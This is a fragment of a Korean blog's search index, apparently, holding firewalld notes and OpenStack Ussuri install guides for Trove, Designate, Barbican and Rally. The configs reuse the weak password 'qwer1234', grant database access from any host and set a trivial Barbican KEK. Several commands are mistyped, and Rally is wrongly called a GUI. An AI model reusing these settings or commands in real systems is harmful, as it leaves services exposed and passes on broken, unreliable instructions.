특별한 포트로의 연결만을 허용하고, 그 외 포트로의 연결은 모두 거부되며 기본 Zone으로 사용    External 존\n 특별히 매스커레이딩 규칙이 적용되는 외부의 라우터를 위해 사용되며, 단지 내부로의 연결 요청 중에서 선택된 연결만을 허용    DMZ 존\n 내부 네트워크로의 접근은 제한적으로 허용되지만, 공개된 네트워크에 대한 접근을 허용하는 경우에 사용되며 이 경우도 선택된 연결만이 허용    Work 존\n 같은 회사에 위치한 네트워크를 위해 사용되며, 대부분 같은 네트워크에 위치한 다른 시스템을 신뢰하고 오직 선택된 연결만을 접속 허용    Home 존\n 홈 영역을 위해 사용되며, 네트워크에 존재하는 다른 시스템을 신뢰하고 오직 선택된 연결만을 접속 허용    Internal 존\n 내부 네트워크를 위해 사용되고, 선택된 연결만을 접속 허용    Trusted 존\n 모든 네트워크 접속 연결을 허용하는 경우 사용         NAT ( Natwork Address Translation )\n  Network Address Translation, IP 패킷 헤더의 IP주소를 변경하는 기능 혹은 그러한 절차.\n  PREROUTING : DNAT를 이용하여 패킷이 생길 때 사용\n  POSTROUTING : SNAT를 이용하여 패킷이 생길 때 사용\n  iptables -L\n   SNAT  Source의 IP주소를 변경하는 것, 내부 -\u0026gt; 외부   DNAT  Destination의 IP주소를 변경하는 것, 외부 -\u0026gt; 내부         명령어  firewall-cmd --[옵션]=[Firewalld Zone] --[add, remove 등의 명령어]-[interface]=[ens33] [ --permanent 영구히 사용]  버전확인 firewall-cmd --version  방화벽 실행여부 확인 firewall-cmd --state  방화벽 리로드 firewall-cmd  Zone 목록을 출력 firewall-cmd --get-zones  Zone 기본 존을 출력 firewall-cmd --get-default-zone  ** 활성화된 Zone을 출력** firewall-cmd --get-active-zones  사용 가능한 서비스/ 포트 목록을 출력 firewall-cmd --lost-all  public 존에 속한 사용 가능한 모든 서비스/ 포트 목록을 출력 firewall-cmd --zone=public --list-all  ftp 서비스 추가 firewall-cmd --add-service=ftp  ftp 서비스를 제거 firewall-cmd --remove-service=ftp  21 tcp 포트를 추가 firewall-cmd --add-port=21/tcp  21 tcp 포트를 제거 firewall-cmd --remove-port=21/tcp  trusted 존에 ftp 서비스를 추가 firewall-cmd --zone=trusted --add-service=ftp  시스템 재부팅 또는 방화벽 재시작 후에도 적용되도록 하려면 \u0026ndash;permanent 옵션 firewall-cmd --permanent --add-service=ftp  포트포워딩 설정 firewall-cmd --add-forward-port=port=1000:proto=tcp:toport=80:toaddr=10.10.10.10  커맨드 확인 firewalld-cmd --get-service  방화벽 사용 중 확인 firewall-cmd --list-service cat /etc/firewalld/zones/public.xml  Zone 영역확인 firewall-cmd --get-zones # 존 영역 확인 firewall-cmd --get-active-zones firewall-cmd --get-active-zones firewall-cmd --get-active-zones firewall-cmd --list-all-zones # 모든 존 영역 확인  방화벽 재시작 firewall-cmd --reload  포트추가 firewall-cmd --zone=public --add-port=9090/tcp  firewall-cmd \u0026ndash;zone=public \u0026ndash;add-icmp-block=redirect\n  룰 확인 firewall-cmd --direct --get-all-rules  룰 추가 firewall-cmd --direct --add-rule ipv4 filter INPUT 0 -p tcp --dport 9090 -j ACCEPT  **** firewall-cmd  **** firewall-cmd  **** firewall-cmd  **** firewall-cmd  **** firewall-cmd  **** firewall-cmd  firewall-cmd \u0026ndash;reload firewall-cmd \u0026ndash;permanent \u0026ndash;zone=external firewall-cmd \u0026ndash;add-forward-port-port=9090:proto=tcp:toport=9090:toaddr=10.10.10.20 firewall-cmd \u0026ndash;set-default-zone=external firewall-cmd \u0026ndash;zone=internal \u0026ndash;add-masquerade\n firewall-cmd \u0026ndash;r\nSTART\nOK\nENG\nASIA\nSEOUL\nDEFALUT\nINTERFACE ( 순서 )\niP설정\nSTART\nYES\nYES\n윈도우가서 로그인\n초기설정\n웹방화벽기능 이메이방어기능\n네트워크 설정\n인터페이스 앤 라우팅 -\u0026gt; 설정\n기본이 거부 출발지\n목적지\n기타 등등\n드러그앤 드랍\n네트워크 인터페이스\n뉴 인터페이스\nnew DNG 서버에 맞게 아이피 설정 규칙에 맞게 설정\n"}),a.add({id:222,href:'/docs/openstack/openstacktraining/openstack-ussuri-12/',title:"OpenStack Ussuri : Trove",content:"! 아직 수정 중 문제있음 OpenStack Ussuri : Trove  ----------------------- ----------------------- ----------------------- | [ Controller Node ] | | [ Compute Node ] | | [ Network Node ] | | | | Libvirt | | Open vSwitch | | MariaDB RabbitMQ | | Nova compute | | L2 Agent | | Memcached Keystone | | Open vSwitch | | L3 Agent | | httpd Cinder API | | L2 Agent | | metadata agent | | Nova-API Compute | | Cinder-LVM | | Swift-proxy | | L2 agent L3 agent | | NFS | | Heat API | | metadata agent | ----------------------- | API-CFN | | Neutron Server | | Heat Engine | | Gnocchi Trove API | ----------------------- ----------------------- --------------------------------- | [ Storage Node 1, 2, 3 ] | | | | Swift-account-auditor | | Swift-account-replicator | | Swift-account | | Swift-container-auditor | | Swift-container-replicator | | Swift-container-updater | | Swift-container | | Swift-object-auditor | | Swift-object-replicator | | Swift-object-updater | | Swift-swift-object | ---------------------------------  OpenStack Ussuri : Trove   Trove는 관리형 데이터베이스 서비스 입니다. Trove*에 대한 설명은 Heat을 참조해주세요.     Trove service 및 User 생성 $ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 trove +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | default_project_id | b470c69e28db47cdbfc81e06cc67f627 | | domain_id | default | | enabled | True | | id | 3cdb0abe0a3a429ba08f98d8db786b6d | | name | trove | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role add --project service --user trove admin $ controller ~(keystone)\u0026gt; openstack service create --name trove --description \u0026#34;Database\u0026#34; database +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | Database | | enabled | True | | id | 701b7dca93e74509aaf811eafc29cc03 | | name | trove | | type | database | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne database public http://controller:8779/v1.0/%\\(tenant_id\\)s +--------------+-------------------------------------------+ | Field | Value | +--------------+-------------------------------------------+ | enabled | True | | id | 58fa28821c444c869be463b550f48651 | | interface | public | | region | RegionOne | | region_id | RegionOne | | service_id | 701b7dca93e74509aaf811eafc29cc03 | | service_name | trove | | service_type | database | | url | http://controller:8779/v1.0/%(tenant_id)s | +--------------+-------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne database internal http://controller:8779/v1.0/%\\(tenant_id\\)s +--------------+-------------------------------------------+ | Field | Value | +--------------+-------------------------------------------+ | enabled | True | | id | 2809c9cb57884ceabf2902c6b6e62ced | | interface | internal | | region | RegionOne | | region_id | RegionOne | | service_id | 701b7dca93e74509aaf811eafc29cc03 | | service_name | trove | | service_type | database | | url | http://controller:8779/v1.0/%(tenant_id)s | +--------------+-------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne database admin http://controller:8779/v1.0/%\\(tenant_id\\)s +--------------+-------------------------------------------+ | Field | Value | +--------------+-------------------------------------------+ | enabled | True | | id | d86280b59bf04be28e71a57ff8b36a0b | | interface | admin | | region | RegionOne | | region_id | RegionOne | | service_id | 701b7dca93e74509aaf811eafc29cc03 | | service_name | trove | | service_type | database | | url | http://controller:8779/v1.0/%(tenant_id)s | +--------------+-------------------------------------------+  Trove 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p $ MariaDB\u0026gt; create database trove; $ MariaDB\u0026gt; grant all privileges on trove.* to trove@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on trove.* to trove@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;    Trove 설치  $ controller ~(keystone)\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-trove python-troveclient # Trove 서비스 및 관련 모듈을 설치합니다. $ controller ~(keystone)\u0026gt; vi /etc/trove/trove.conf [DEFAULT] network_driver = trove.network.neutron.NeutronDriver management_networks = ef7541ad-9599-4285-878a-e0ab62032b03 management_security_groups = d0d797f7-11d4-436e-89a3-ac8bca829f81 cinder_volume_type = lvmdriver-1 nova_keypair = trove-mgmt default_datastore = mysql taskmanager_manager = trove.taskmanager.manager.Manager trove_api_workers = 5 transport_url = rabbit://openstack:qwer1234@controller control_exchange = trove rpc_backend = rabbit reboot_time_out = 300 usage_timeout = 900 agent_call_high_timeout = 1200 use_syslog = False debug = True [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = trove password = qwer1234 service_token_roles_required = true [service_credentials] auth_url = http://controller/identity/v3 region_name = RegionOne project_name = service password = qwer1234 project_domain_name = Default user_domain_name = Default username = trove [database] connection = mysql+pymysql://trove:qwer1234@controller/trove [mariadb] tcp_ports = 3306,4444,4567,4568 [mysql] tcp_ports = 3306 [postgresql] tcp_ports = 5432 $ controller ~(keystone)\u0026gt; vi /etc/trove/trove-guestagent.conf [DEFAULT] log_file = trove-guestagent.log log_dir = /var/log/trove/ ignore_users = os_admin control_exchange = trove transport_url = rabbit://openstack:qwer1234@controller rpc_backend = rabbit command_process_timeout = 60 use_syslog = False debug = True [service_credentials] auth_url = http://controller/identity/v3 region_name = RegionOne project_name = service password = qwer1234 project_domain_name = Default user_domain_name = Default username = trove $ controller ~(keystone)\u0026gt; su -s /bin/sh -c \u0026#34;trove-manage db_sync\u0026#34; trove $ controller ~(keystone)\u0026gt; systemctl enable --now openstack-trove-api.service openstack-trove-taskmanager.service openstack-trove-conductor.service $ controller ~(keystone)\u0026gt;   "}),a.add({id:223,href:'/docs/openstack/openstacktraining/openstack-ussuri-13/',title:"OpenStack Ussuri : Designate",content:"OpenStack Ussuri : Designate  ----------------------- ----------------------- ----------------------- | [ Controller Node ] | | [ Compute Node ] | | [ Network Node ] | | | | Libvirt | | Open vSwitch | | MariaDB RabbitMQ | | Nova compute | | L2 Agent | | Memcached Keystone | | Open vSwitch | | L3 Agent | | httpd Cinder API | | L2 Agent | | metadata agent | | Nova-API Compute | | Cinder-LVM | | Swift-proxy | | L2 agent L3 agent | | NFS | | Heat API | | metadata agent | ----------------------- | API-CFN | | Neutron Server | | Heat Engine | | Gnocchi Trove API | | Designate Services | ----------------------- -----------------------  OpenStack Ussuri : Designate   Designate는 OpenStack 서비스에서 DNS 서비스를 배포, 관리를 담당합니다. Desigante는 Network node의 설치를 진행하고, controller node의 API를 이용하겠습니다. Designate의 보다 자세한 설명은 Designate를 참조해주세요.     Designate service 및 User 생성 $ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 designate +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | default_project_id | b470c69e28db47cdbfc81e06cc67f627 | | domain_id | default | | enabled | True | | id | 7563701765d24b4884c0b324b7997530 | | name | designate | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role add --project service --user designate admin $ controller ~(keystone)\u0026gt; openstack service create --name designate --description \u0026#34;OpenStack DNS Service\u0026#34; dns +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | OpenStack DNS Service | | enabled | True | | id | 0e7dacc11b5b48c099d3fe110f8b8197 | | name | designate | | type | dns | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne dns public http://network:9001/ +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | 20b26900a14d44209ade2fab0a0f3bbc | | interface | public | | region | RegionOne | | region_id | RegionOne | | service_id | 0e7dacc11b5b48c099d3fe110f8b8197 | | service_name | designate | | service_type | dns | | url | http://network:9001/ | +--------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne dns internal http://network:9001/ +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | 856883757b604b93a1273ecc4775f549 | | interface | internal | | region | RegionOne | | region_id | RegionOne | | service_id | 0e7dacc11b5b48c099d3fe110f8b8197 | | service_name | designate | | service_type | dns | | url | http://network:9001/ | +--------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne dns admin http://network:9001/ +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | c6fef7cbb6a848228fa8ef4067ebcc49 | | interface | admin | | region | RegionOne | | region_id | RegionOne | | service_id | 0e7dacc11b5b48c099d3fe110f8b8197 | | service_name | designate | | service_type | dns | | url | http://network:9001/ | +--------------+----------------------------------+  Designate 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p $ MariaDB\u0026gt; create database designate; $ MariaDB\u0026gt; grant all privileges on designate.* to designate@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on designate.* to designate@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;    Network Node Desigante 설치  $ network\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-designate-api openstack-designate-central openstack-designate-worker openstack-designate-producer openstack-designate-mdns python3-designateclient bind bind-utils # designate 및 관련 모듈을 설치합니다. $ network\u0026gt; rndc-confgen -a -k designate -c /etc/designate.key -r /dev/urandom $ network\u0026gt; chown named:designate /etc/designate.key $ network\u0026gt; chmod 640 /etc/designate.key # 역할기반 키를 생성하고 권한을 설정합니다. $ network\u0026gt; cp /etc/named.conf /etc/named.conf.backup $ network\u0026gt; vi /etc/named.conf options { listen-on port 53 { any; }; listen-on-v6 port 53 { none; }; directory \u0026#34;/var/named\u0026#34;; dump-file \u0026#34;/var/named/data/cache_dump.db\u0026#34;; statistics-file \u0026#34;/var/named/data/named_stats.txt\u0026#34;; memstatistics-file \u0026#34;/var/named/data/named_mem_stats.txt\u0026#34;; # replace query range to your environment allow-query { localhost; 10.10.10.0/24; }; allow-new-zones yes; request-ixfr no; recursion no; bindkeys-file \u0026#34;/etc/named.iscdlv.key\u0026#34;; managed-keys-directory \u0026#34;/var/named/dynamic\u0026#34;; pid-file \u0026#34;/run/named/named.pid\u0026#34;; session-keyfile \u0026#34;/run/named/session.key\u0026#34;; }; include \u0026#34;/etc/designate.key\u0026#34;; controls { inet 0.0.0.0 port 953 allow { localhost; } keys { \u0026#34;designate\u0026#34;; }; }; logging { channel default_debug { file \u0026#34;data/named.run\u0026#34;; severity dynamic; }; }; zone \u0026#34;.\u0026#34; IN { type hint; file \u0026#34;named.ca\u0026#34;; }; $ network\u0026gt; chmod 640 /etc/named.conf $ network\u0026gt; chgrp named /etc/named.conf $ network\u0026gt; chown -R named. /var/named $ network\u0026gt; systemctl enable --now named # named dns 서비스를 시작합니다. $ network\u0026gt; vi /etc/designate/designate.conf [DEFAULT] log_dir = /var/log/designate transport_url = rabbit://openstack:qwer1234@controller root_helper = sudo designate-rootwrap /etc/designate/rootwrap.conf [database] connection = mysql+pymysql://designate:qwer1234@controller/designate [service:api] listen = 0.0.0.0:9001 auth_strategy = keystone api_base_uri = http://network:9001 enable_api_v2 = True enabled_extensions_v2 = quotas, reports [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = designate password = qwer1234 [service:worker] enabled = True notify = True [storage:sqlalchemy] connection = mysql+pymysql://designate:qwer1234@controller/designate $ network\u0026gt; su -s /bin/bash -c \u0026#34;designate-manage database sync\u0026#34; designate $ network\u0026gt; systemctl enable --now designate-central designate-api # designate api db를 임포트 시키고 서비스를 시작 및 등록합니다. $ network\u0026gt; vi /etc/designate/pools.yaml - name: default description: Default Pool attributes: {} ns_records: - hostname: network priority: 1 nameservers: - host: network port: 53 targets: - type: bind9 description: BIND9 Server masters: - host: network port: 5354 options: host: network port: 53 rndc_host: network rndc_port: 953 rndc_key_file: /etc/designate.key $ network\u0026gt; chmod 640 /etc/designate/pools.yaml $ network\u0026gt; chgrp designate /etc/designate/pools.yaml $ network\u0026gt; su -s /bin/bash -c \u0026#34;designate-manage pool update\u0026#34; designate $ network\u0026gt; systemctl enable --now designate-worker designate-producer designate-mdns # designate pool db를 임포트 시키고 서비스를 시작 및 등록합니다. $ network\u0026gt; setsebool -P named_write_master_zones on $ network\u0026gt; firewall-cmd --add-service=dns --permanent $ network\u0026gt; firewall-cmd --add-port={5354/tcp,9001/tcp} --permanent $ network\u0026gt; firewall-cmd --reload # SELinux 및 방화벽을 설정합니다.    확인  $ controller ~(keystone)\u0026gt; openstack dns service list +--------------------------------------+----------+--------------+--------+-------+--------------+ | id | hostname | service_name | status | stats | capabilities | +--------------------------------------+----------+--------------+--------+-------+--------------+ | 43f62f8d-20bc-43b9-8c64-758ac0a2a074 | network | central | UP | - | - | | ab90b2dc-381d-4ca8-ae66-fad57a9f9c11 | network | api | UP | - | - | | 2dbc8027-0c6a-4c4a-b7a0-92a2b19517a7 | network | worker | UP | - | - | | 502ce893-3256-432f-9c6f-2353078ee585 | network | producer | UP | - | - | | 078b306a-e3bb-461d-9c97-71679c9f8830 | network | mdns | UP | - | - | +--------------------------------------+----------+--------------+--------+-------+--------------+ $ controller ~(keystone)\u0026gt; openstack zone create --email dnsmaster@server.education server.education. $ controller ~(keystone)\u0026gt; openstack zone list $ controller ~(keystone)\u0026gt; openstack recordset create --record \u0026#39;192.168.100.10\u0026#39; --type A server.education. node01 $ controller ~(keystone)\u0026gt; openstack recordset list server.education. $ controller ~(keystone)\u0026gt; dig -p 5354 @network.srv.world node01.server.education. $ controller ~(keystone)\u0026gt; openstack zone create --email dnsmaster@server.education 100.168.192.in-addr.arpa. $ controller ~(keystone)\u0026gt; openstack zone list $ controller ~(keystone)\u0026gt; openstack recordset create --record \u0026#39;node01.server.education.\u0026#39; --type PTR 100.168.192.in-addr.arpa. 10 $ controller ~(keystone)\u0026gt; openstack recordset list 100.168.192.in-addr.arpa. $ controller ~(keystone)\u0026gt; dig -p 5354 @network.srv.world -x 192.168.100.10 $ controller ~(keystone)\u0026gt; openstack recordset list server.education. $ controller ~(keystone)\u0026gt; openstack recordset delete server.education. node01.server.education. $ controller ~(keystone)\u0026gt; openstack recordset list server.education. $ controller ~(keystone)\u0026gt; openstack zone list $ controller ~(keystone)\u0026gt; openstack zone delete server.education. $ controller ~(keystone)\u0026gt; openstack zone list   "}),a.add({id:224,href:'/docs/openstack/openstacktraining/openstack-ussuri-14/',title:"OpenStack Ussuri : Barbican",content:"OpenStack Ussuri : Barbican  ----------------------- ----------------------- ----------------------- | [ Controller Node ] | | [ Compute Node ] | | [ Network Node ] | | | | Libvirt | | Open vSwitch | | MariaDB RabbitMQ | | Nova compute | | L2 Agent | | Memcached Keystone | | Open vSwitch | | L3 Agent | | httpd Cinder API | | L2 Agent | | metadata agent | | Nova-API Compute | | Cinder-LVM | | Swift-proxy | | L2 agent L3 agent | | NFS | | Heat API | | metadata agent | ----------------------- | API-CFN | | Neutron Server | | Heat Engine | | Gnocchi Trove API | | Designate Services | | Barbican API | ----------------------- -----------------------  OpenStack Ussuri : Barbican   Barbican은 키 관리 서비스 입니다. 비밀 데이터의 안전한 저장, 프로비저닝 및 관리를 제공합니다. 여기에는 대칭 키, 비대칭 키, 인증서 및 원시 바이너리 데이터와 같은 키 자료가 포함됩니다. 자세한 설명은 Barbican을 참조해주세요.     Barbican service 및 User 생성 $ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 barbican +---------------------+----------------------------------+ | Field | Value | +---------------------+----------------------------------+ | default_project_id | b470c69e28db47cdbfc81e06cc67f627 | | domain_id | default | | enabled | True | | id | bc85b317bd7c4cc1a4d5aee81c383421 | | name | barbican | | options | {} | | password_expires_at | None | +---------------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack role add --project service --user barbican admin $ controller ~(keystone)\u0026gt; openstack service create --name barbican --description \u0026#34;OpenStack Key Manager\u0026#34; key-manager -------------------------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | OpenStack Key Manager | | enabled | True | | id | ec2cbdda740a4887b5737fe885b4b86e | | name | barbican | | type | key-manager | +-------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne key-manager public http://controller:9311 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | 3254f8ccb5894560ab3dea0268dddd03 | | interface | public | | region | RegionOne | | region_id | RegionOne | | service_id | ec2cbdda740a4887b5737fe885b4b86e | | service_name | barbican | | service_type | key-manager | | url | http://controller:9311 | +--------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne key-manager internal http://controller:9311 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | 37a440f72212422ca7c590e322afe56c | | interface | internal | | region | RegionOne | | region_id | RegionOne | | service_id | ec2cbdda740a4887b5737fe885b4b86e | | service_name | barbican | | service_type | key-manager | | url | http://controller:9311 | +--------------+----------------------------------+ $ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne key-manager admin http://controller:9311 +--------------+----------------------------------+ | Field | Value | +--------------+----------------------------------+ | enabled | True | | id | 2ad3a9aabcb840cc832470039ee37b00 | | interface | admin | | region | RegionOne | | region_id | RegionOne | | service_id | ec2cbdda740a4887b5737fe885b4b86e | | service_name | barbican | | service_type | key-manager | | url | http://controller:9311 | +--------------+----------------------------------+    Barbican 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p $ MariaDB\u0026gt; create database barbican; $ MariaDB\u0026gt; grant all privileges on barbican.* to barbican@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on barbican.* to barbican@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;    contoller node Barbican 설치 $ controller ~(keystone)\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-barbican # Barbucan 서비스 및 관련 모듈을 설치합니다. $ controller ~(keystone)\u0026gt; vi /etc/barbican/barbican.conf [DEFAULT] bind_host = 0.0.0.0 bind_port = 9311 host_href = http://controller:9311 log_file = /var/log/barbican/api.log sql_connection = mysql+pymysql://barbican:qwer1234@controller/barbican transport_url = rabbit://openstack:qwer1234@controller [oslo_policy] policy_file = /etc/barbican/policy.json policy_default_rule = default [secretstore] namespace = barbican.secretstore.plugin enabled_secretstore_plugins = store_crypto [crypto] namespace = barbican.crypto.plugin enabled_crypto_plugins = simple_crypto [simple_crypto_plugin] kek = \u0026#39;YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY=\u0026#39; [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = barbican password = qwer1234 $ controller ~(keystone)\u0026gt; su -s /bin/bash barbican -c \u0026#34;barbican-manage db upgrade\u0026#34; $ controller ~(keystone)\u0026gt; systemctl enable --now openstack-barbican-api # Barbican 서비스를 DB에 임포트 시킨 후, 서비스를 등록합니다. $ controller ~(keystone)\u0026gt; firewall-cmd --add-port=9311/tcp --permanent $ controller ~(keystone)\u0026gt; firewall-cmd --reload # 방화벽을 설정합니다.    확인  $ controller ~(keystone)\u0026gt; openstack secret store --name secret01 --payload secretkey +---------------+------------------------------------------------------------------------+ | Field | Value | +---------------+------------------------------------------------------------------------+ | Secret href | http://controller:9311/v1/secrets/86cbaa20-0cb9-479f-82ed-80a02f34b83d | | Name | secret01 | | Created | None | | Status | None | | Content types | None | | Algorithm | aes | | Bit length | 256 | | Secret type | opaque | | Mode | cbc | | Expiration | None | +---------------+------------------------------------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack secret list +------------------------------------------------------------------------+----------+---------------------------+--------+---------------------------+-----------+------------+-------------+------+------------+ | Secret href | Name | Created | Status | Content types | Algorithm | Bit length | Secret type | Mode | Expiration | +------------------------------------------------------------------------+----------+---------------------------+--------+---------------------------+-----------+------------+-------------+------+------------+ | http://controller:9311/v1/secrets/86cbaa20-0cb9-479f-82ed-80a02f34b83d | secret01 | 2020-08-16T09:00:00+00:00 | ACTIVE | {\u0026#39;default\u0026#39;: \u0026#39;text/plain\u0026#39;} | aes | 256 | opaque | cbc | None | +------------------------------------------------------------------------+----------+---------------------------+--------+---------------------------+-----------+------------+-------------+------+------------+ $ controller ~(keystone)\u0026gt; openstack secret get http://controller:9311/v1/secrets/86cbaa20-0cb9-479f-82ed-80a02f34b83d +---------------+------------------------------------------------------------------------+ | Field | Value | +---------------+------------------------------------------------------------------------+ | Secret href | http://controller:9311/v1/secrets/86cbaa20-0cb9-479f-82ed-80a02f34b83d | | Name | secret01 | | Created | 2020-08-16T09:00:00+00:00 | | Status | ACTIVE | | Content types | {\u0026#39;default\u0026#39;: \u0026#39;text/plain\u0026#39;} | | Algorithm | aes | | Bit length | 256 | | Secret type | opaque | | Mode | cbc | | Expiration | None | +---------------+------------------------------------------------------------------------+ # get 뒤에는 키 생성시 생성되는 값을 입력해주셔야 됩니다 ! $ controller ~(keystone)\u0026gt; openstack secret get http://controller:9311/v1/secrets/86cbaa20-0cb9-479f-82ed-80a02f34b83d --payload +---------+-----------+ | Field | Value | +---------+-----------+ | Payload | secretkey | +---------+-----------+ $ controller ~(keystone)\u0026gt; openstack secret order create --name secret02 --algorithm aes --bit-length 256 --mode cbc --payload-content-type application/octet-stream key +----------------+-----------------------------------------------------------------------+ | Field | Value | +----------------+-----------------------------------------------------------------------+ | Order href | http://controller:9311/v1/orders/ffe9a05e-db5e-4b7d-8b5a-86f1349863c3 | | Type | Key | | Container href | N/A | | Secret href | None | | Created | None | | Status | None | | Error code | None | | Error message | None | +----------------+-----------------------------------------------------------------------+ $ controller ~(keystone)\u0026gt; openstack secret order list +-----------------------------------------------------------------------+------+----------------+------------------------------------------------------------------------+---------------------------+--------+------------+---------------+ | Order href | Type | Container href | Secret href | Created | Status | Error code | Error message | +-----------------------------------------------------------------------+------+----------------+------------------------------------------------------------------------+---------------------------+--------+------------+---------------+ | http://controller:9311/v1/orders/ffe9a05e-db5e-4b7d-8b5a-86f1349863c3 | Key | N/A | http://controller:9311/v1/secrets/4c3e2e5b-3585-44ae-901a-25dee6ede5a7 | 2020-08-16T09:08:06+00:00 | ACTIVE | None | None | +-----------------------------------------------------------------------+------+----------------+------------------------------------------------------------------------+---------------------------+--------+------------+---------------+ $ controller ~(keystone)\u0026gt; openstack secret order get http://controller:9311/v1/orders/ffe9a05e-db5e-4B7D-8B5A-86f1349863c3 +----------------+------------------------------------------------------------------------+ | Field | Value | +----------------+------------------------------------------------------------------------+ | Order href | http://controller:9311/v1/orders/ffe9a05e-db5e-4b7d-8b5a-86f1349863c3 | | Type | Key | | Container href | N/A | | Secret href | http://controller:9311/v1/secrets/4c3e2e5b-3585-44ae-901a-25dee6ede5a7 | | Created | 2020-08-16T09:08:06+00:00 | | Status | ACTIVE | | Error code | None | | Error message | None | +----------------+------------------------------------------------------------------------+ # get 뒤에는 키 생성시 생성되는 값을 입력해주셔야 됩니다 ! $ controller ~(keystone)\u0026gt; openstack secret get http://controller:9311/v1/secrets/4c3e2e5b-3585-44ae-901a-25dee6ede5a7 +---------------+------------------------------------------------------------------------+ | Field | Value | +---------------+------------------------------------------------------------------------+ | Secret href | http://controller:9311/v1/secrets/4c3e2e5b-3585-44ae-901a-25dee6ede5a7 | | Name | secret02 | | Created | 2020-08-16T09:08:06+00:00 | | Status | ACTIVE | | Content types | {\u0026#39;default\u0026#39;: \u0026#39;application/octet-stream\u0026#39;} | | Algorithm | aes | | Bit length | 256 | | Secret type | symmetric | | Mode | cbc | | Expiration | None | +---------------+------------------------------------------------------------------------+ # get 뒤에는 키 생성시 생성되는 값을 입력해주셔야 됩니다 !   "}),a.add({id:225,href:'/docs/openstack/openstacktraining/openstack-ussuri-15/',title:"OpenStack Ussuri : Rally",content:"OpenStack Ussuri : Rally  ----------------------- ----------------------- ----------------------- | [ Controller Node ] | | [ Compute Node ] | | [ Network Node ] | | | | Libvirt | | Open vSwitch | | MariaDB RabbitMQ | | Nova compute | | L2 Agent | | Memcached Keystone | | Open vSwitch | | L3 Agent | | httpd Cinder API | | L2 Agent | | metadata agent | | Nova-API Compute | | Cinder-LVM | | Swift-proxy | | L2 agent L3 agent | | NFS | | Heat API | | metadata agent | ----------------------- | API-CFN | | Neutron Server | | Heat Engine | | Gnocchi Trove API | | Designate Services | | Barbican API | ----------------------- | Rally | -----------------------  OpenStack Ussuri : Rally   Rally는 오픈스택 소스를 GUI 환경으로 보여주는 서비스입니다. Rally의 자세한 설명은 Rally를 참조해주세요.     Rally 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p $ MariaDB\u0026gt; create database rally; $ MariaDB\u0026gt; grant all privileges on Rally.* to rally@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on Rally.* to rally@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;    Rally 설치 $ controller ~(keystone)\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-rally openstack-rally-plugins python3-fixtures # Rally 서비스 및 관련 모듈을 설치합니다. $ controller ~(keystone)\u0026gt; vi /etc/rally/rally.conf [DEFAULT] log_file = rally.log log_dir = 